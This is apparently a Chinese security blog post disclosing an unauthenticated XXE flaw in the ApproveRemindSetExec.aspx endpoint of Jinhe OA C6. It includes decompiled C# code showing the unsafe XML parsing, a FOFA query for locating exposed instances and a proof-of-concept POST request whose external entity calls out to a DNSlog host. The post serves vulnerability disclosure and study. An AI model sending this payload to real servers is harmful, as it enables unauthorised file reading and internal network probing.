---
title: "金和OA ApproveRemindSetExec.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ApproveRemindSetExec-xxe.html
asset_dir: assets/金和oa-approveremindsetexec.aspx-xxe漏洞
---

# 金和OA ApproveRemindSetExec.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/14 08:22
- 607浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

漏洞修复方案

计算机安全

网络安全培训

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ApproveRemindSetExec.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

VPN服务

恶意软件分析工具

Windows安全工具

直接根据 `ApproveRemindSetExec.aspx` 在 bin 目录下查找 `JHSoft.Web.AddMenu.dll` 将其进行反编译后找到 `ApproveRemindSetExec` 的处理逻辑

```
public class ApproveRemindSetExec : JHSoft.Base.Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    Stream inputStream = this.Request.InputStream;
    byte[] numArray = new byte[(int) inputStream.Length];
    inputStream.Read(numArray, 0, numArray.Length);
    inputStream.Close();
    string xml = Encoding.UTF8.GetString(numArray);
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.AddMenu/ApproveRemindSetExec.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA ApproveRemindSetExec.aspx XXE漏洞](images/img-001-9bd1b22889f1.webp)](https://image.mrxn.net/14e85609e7cd443e8926917295be178b.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
